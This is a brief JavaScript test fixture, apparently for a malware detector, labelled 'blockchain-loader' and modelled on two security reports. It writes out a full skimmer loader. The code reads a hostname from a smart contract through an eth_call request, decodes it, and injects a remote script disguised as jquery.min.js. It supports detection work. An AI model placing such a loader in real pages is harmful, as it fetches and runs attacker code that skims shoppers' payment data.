// expect: blockchain-loader
// Modeled on Confiant, "Skimming on the blockchain" (2026) and Trinity Cyber, "Lost in the Ether" (2026):
// read a hostname from a smart contract with eth_call, then load the skimmer from it.
fetch('https://rpc.example/sep', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ method: 'eth_call', params: [{ to: '0x0000000000000000000000000000000000000000', data: '0xe00fe2eb' }, 'latest'], id: 46, jsonrpc: '2.0' })
}).then((r) => r.json()).then((j) => {
  const host = atob(j.result.slice(2));
  const s = document.createElement('script');
  s.src = 'https://' + host + '/1/shop/jquery.min.js';
  document.head.appendChild(s);
});
